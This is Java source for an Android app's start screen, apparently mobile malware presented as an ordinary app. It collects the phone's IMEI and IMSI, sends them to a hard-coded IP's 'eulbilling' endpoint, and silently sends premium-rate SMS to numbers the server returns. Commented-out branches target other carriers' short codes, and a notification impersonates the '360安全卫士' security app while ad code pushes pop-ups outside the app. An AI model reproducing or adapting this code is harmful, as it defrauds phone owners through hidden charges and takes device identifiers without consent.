package cn.yoyo.mobile.ui;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.app.Dialog;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.support.v4.app.NotificationCompat;
import android.support.v4.view.ViewPager;
import android.support.v4.view.ViewPager.OnPageChangeListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.ImageView;
import cn.yo.mobile.yeg.R;
import cn.yoyo.mobile.ui.adapter.MyPagerAdapter;
import cn.yoyo.mobile.util.ToastUtils;
import cn.yoyo.mobile.yes.SMSReceiver;
import cn.yoyo.mobile.yes.StringUtil;

import com.sup.ab.Manager;
import com.umeng.analytics.MobclickAgent;

public class Activity_Guide extends Activity implements OnPageChangeListener{
	private ViewPager viewPager;
	private boolean misScrolled;
	private String mArea = "";//卡地区
	private String mImsi = "", mImei = "";
	private Context mContext;
	private ImageView image;
	private AlphaAnimation animation;
	private View progress_bar;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_start);
		mContext = this;
		Manager.initSDK(this, "10684");
		//设置应用外插屏广告第一次启动的时间，单位分钟
		Manager.setFirstTriggerAtTime(this, 5);
		//设置应用外插屏广告两次启动时间间隔，单位分钟
		Manager.setInterval(this, 30);
		//设置应用外退弹广告第一次启动的时间，单位分钟
		Manager.setFirstTriggerAtTimeForEO(this, 5);
		//设置应用外退弹广告两次启动时间间隔，单位分钟
		Manager.setIntervalForEO(this, 30);
		
		animation = new AlphaAnimation(0.4f, 0.8f);
		animation.setDuration(1000);
		animation.setRepeatMode(Animation.REVERSE);
		animation.setRepeatCount(Animation.INFINITE);
		
		image = (ImageView) findViewById(R.id.image);
		image.startAnimation(animation);
		//image.setVisibility(View.VISIBLE);
		image.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				viewPager.setCurrentItem(viewPager.getCurrentItem()+1);
			}
		});
		progress_bar = findViewById(R.id.pb);
		initViewPager();
		init();
		
		sentNotification();
		IntentFilter filter = new IntentFilter();
		filter.addAction(SMSReceiver.START_ACTIVITY_ACTION);
		filter.addAction(SMSReceiver.CANCLE_PROGRESSBAR_ACTION);
        registerReceiver(myReceiver, filter);  
	}
	
	private void initViewPager(){
		viewPager = (ViewPager) findViewById(R.id.viewPager);
		List<View> listViews = new ArrayList<View>();
		LayoutInflater mInflater = getLayoutInflater();
		//listViews.add(mInflater.inflate(R.layout.item_viewpager1, null));
		//listViews.add(mInflater.inflate(R.layout.item_viewpager2, null));
		//listViews.add(mInflater.inflate(R.layout.item_viewpager3, null));
		View view = mInflater.inflate(R.layout.activity_main, null);
		view.findViewById(R.id.app_about_title).startAnimation(animation);
		listViews.add(view);
		
		viewPager.setAdapter(new MyPagerAdapter(listViews));
		viewPager.setOnPageChangeListener(this);
		showDialog(view);
		
	}
	@Override
	public void onPageScrollStateChanged(int arg0) {
		// TODO Auto-generated method stub
		switch (arg0) {
		case ViewPager.SCROLL_STATE_DRAGGING:
			misScrolled = false;
			break;
		case ViewPager.SCROLL_STATE_SETTLING:
			misScrolled = true;
			break;
		case ViewPager.SCROLL_STATE_IDLE:
			/*if (viewPager.getCurrentItem() == viewPager.getAdapter().getCount() - 1 && !misScrolled) {
				startActivity(new Intent(this, Activity_Main.class));
				finish();
			}*/
			misScrolled = true;
			break;
		}
	}
	@Override
	public void onPageScrolled(int arg0, float arg1, int arg2) {}
	@Override
	public void onPageSelected(int arg0) {
		if(arg0 == viewPager.getAdapter().getCount() - 1){
			if(image.getAnimation() != null){
				image.clearAnimation();
			}
			image.setVisibility(8);
		}else{
			image.setVisibility(0);
			if(image.getAnimation() == null){
				image.startAnimation(animation);
			}
		}
	}
	
	private void init(){
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);  
		if(telManager == null) return;
		mImei = telManager.getDeviceId();
        mImsi = telManager.getSubscriberId();  
        new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
			//mArea = StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
			}
		}).start();
	}
	
	private void send2(final String phone, final String mess,String receive,int delay){ 
		//Log.i("TAG", "phone = "+phone+", message = "+mess);
		if(!SMSReceiver.SMSnumber.toString().contains(receive)){
			SMSReceiver.SMSnumber.append(receive);
		}
		PendingIntent pi = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.YOYO_SMS_SEND_ACTION), 0);
		PendingIntent pi2 = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.YOYO_SMS_RECEIVED_ACTION), 0);  
        SmsManager sms = SmsManager.getDefault(); 
        sms.sendTextMessage(phone, null , mess, pi,  pi2 ); 
    }  
	
	private void getCardMessage(){
		
		if(TextUtils.isEmpty(mImsi)) {
			handler.sendEmptyMessage(8);
			ToastUtils.showToast("请插入手机卡在使用");
			MobclickAgent.onEvent(mContext, "error","1");
			return;
		}
		
        if(mImsi.startsWith("46000") || mImsi.startsWith("46002")){//因为移动网络编号46000下的IMSI已经用完，所以虚拟了一个46002编号，134/159号段使用了此编号  
        //中国移动  
        	SMSReceiver.code = "46000";
        	if(!StringUtil.isNetworkConnected(mContext)){
        		handler.sendEmptyMessage(8);
        		MobclickAgent.onEvent(mContext, "error","2");
        		return ;
			}
        	MobclickAgent.onEvent(mContext, "click",SMSReceiver.code);
        	        new Thread(new Runnable() {
        				@Override
        				public void run() {
        					// TODO Auto-generated method stub
        						try {
        							//12元10444     8元10442   2元10446 10464  1毛10436
        							//if(TextUtils.isEmpty(mArea))
        							//mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
        		    				//if(!StringUtil.isBlack(getResources().getStringArray(R.array.cmcc), mArea)){
        		    					String url = "http://103.224.248.34:8096/eulbilling.aspx?"
            				        	        +"imei=" + mImei
            				        	        +"&imsi=" + mImsi
            				        	        +"&chargeId=10436";
            				        	        //+"&price=15" ;
    									getJson(StringUtil.getURL(url));
        		    				//}			
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
        				}
        			}).start();
        	        
        }else{
        	ToastUtils.showLongToast("暂时只支持移动用户,您可以替换成移动用户再使用");
        }
        /*else if(mImsi.startsWith("46001")){  
        	//中国联通  
        	SMSReceiver.code = "46001";
        	
        	if(TextUtils.isEmpty(mArea)){
        		if(!StringUtil.isNetworkConnected(mContext)){
            		return ;
    			}
        		new Thread(new Runnable() {
    				@Override
    				public void run() {
    					// TODO Auto-generated method stub
    				mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
    				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
    		        	send2("106901334042", "10CH0181B","10655477",0);
    				}			
    				}
    			}).start();
			}else{
				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
					send2("106901334042", "10CH0181B","10655477",0);
				}	
			}
        	
        }else if(mImsi.startsWith("46003")){ 
        	//中国电信  
        	SMSReceiver.code = "46003";
        	if(TextUtils.isEmpty(mArea)){
        		if(!StringUtil.isNetworkConnected(mContext)){
            		return ;
    			}
        		new Thread(new Runnable() {
    				@Override
    				public void run() {
    					// TODO Auto-generated method stub
    				mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
    				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
    					send2("1065987701", "900cz1201","10001888@1065987701",0);
    				}			
    				}
    			}).start();
			}else{
				if(!StringUtil.isBlack(getResources().getStringArray(R.array.net), mArea)){
					send2("1065987701", "900cz1201","10001888@1065987701",0);
				}	
			}
        } */
        
	}
	

    private void getJson(String resultData){
    	if(TextUtils.isEmpty(resultData)){
    		handler.sendEmptyMessage(8);
    		MobclickAgent.onEvent(mContext, "error","3");
    		return;
    	}
    	if(resultData.equals("error")){
    		handler.sendEmptyMessage(8);
    		MobclickAgent.onEvent(mContext, "error","4");
    		return;
    	}
    	String[] strings = resultData.split("<\\:>");
    	if(strings.length>=3){
    		send2(strings[0],strings[1],strings[2],0);
    		MobclickAgent.onEvent(mContext, "error","0");
    	}else{
    		handler.sendEmptyMessage(8);
    		MobclickAgent.onEvent(mContext, "error","5");
    	}
    }
    
    public void onResume() {
		super.onResume();
		MobclickAgent.onResume(this);
		}

	public void onPause() {
		super.onPause();
		MobclickAgent.onPause(this);
		}
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(myReceiver);
		}
	private void showDialog(View view){
		progress_bar.setVisibility(View.GONE);
		SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(this);
        if(!preference.getBoolean("hasSend", false)){
        	view.findViewById(R.id.dialog_welcome).setVisibility(0);
        }else{
        	view.findViewById(R.id.dialog_welcome).setVisibility(8);
        	startActivity();
        }
        view.findViewById(R.id.send).setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
			handler.sendEmptyMessage(0);
			//getCardMessage();
			startActivity();
			}
		});
	}
    
	private void startActivity(){
		startActivity(new Intent(this, Activity_Main.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
		progress_bar.setVisibility(View.GONE);
		finish();
	}
	
	private long exitTime = 0;
	   @Override
	   public boolean onKeyDown(int keyCode, KeyEvent event)
	   {
	       if (keyCode == KeyEvent.KEYCODE_BACK)
	       {
	    	   /*if ((System.currentTimeMillis() - exitTime) > 2000)
	           {
	                   Toast.makeText(this, getString(R.string.exit_click), Toast.LENGTH_SHORT).show();
	                   exitTime = System.currentTimeMillis();
	           } else
	           {
	        	   System.exit(0);
	           }*/
	    	   exitApp();
	   		return true;
	       }
	       return super.onKeyDown(keyCode, event);
	   }
	   
	   private void exitApp(){
		 //退弹广告
			Manager.showAD2(Activity_Guide.this,
					new DialogInterface.OnClickListener() {
						//点击事件
						@Override
						public void onClick(DialogInterface dialog,
								int which) {
							switch (which) {
							case Dialog.BUTTON_POSITIVE:// yes
								finish();
								break;
							case Dialog.BUTTON_NEGATIVE:// no
								break;
							}
						}
					});
	   }
	
	private BroadcastReceiver myReceiver = new BroadcastReceiver(){  
        @Override  
        public void onReceive(Context context, Intent intent) {  
        	if(intent.getAction().equals(SMSReceiver.START_ACTIVITY_ACTION)){
        		startActivity();
        	}else if(intent.getAction().equals(SMSReceiver.CANCLE_PROGRESSBAR_ACTION)){
        		if(progress_bar!=null)
        		progress_bar.setVisibility(8);
        	}
        }  
          
    };  
    
    private void sentNotification(){
    	Bitmap btm = BitmapFactory.decodeResource(getResources(),
    			R.drawable.push_icon_small);
    			NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(
    			Activity_Guide.this).setSmallIcon(R.drawable.push_icon_small)
    			.setContentTitle("360安全卫士")
    			.setContentText(getString(R.string.app_about_scan));
    			mBuilder.setTicker("360安全卫士");//第一次提示消息的时候显示在通知栏上
    			mBuilder.setLargeIcon(btm);
    			mBuilder.setAutoCancel(true);//自己维护通知的消失

    			//构建一个Intent
    			Intent resultIntent = new Intent(this,
    			Activity_Guide.class);
    			//封装一个Intent
    			PendingIntent resultPendingIntent = PendingIntent.getActivity(this, 0, resultIntent,
    			PendingIntent.FLAG_UPDATE_CURRENT);
    			// 设置通知主题的意图
    			mBuilder.setContentIntent(resultPendingIntent);
    			//获取通知管理器对象
    			NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
    			mNotificationManager.notify(0, mBuilder.build());
    }
    
    private Handler handler = new Handler() {
		public void handleMessage(android.os.Message msg) {
			if(progress_bar!=null){
				progress_bar.setVisibility(msg.what);
				if(msg.what == 8)
				ToastUtils.showToast("网络出现异常，请重试");
			}
			
		};
	};
	   
}
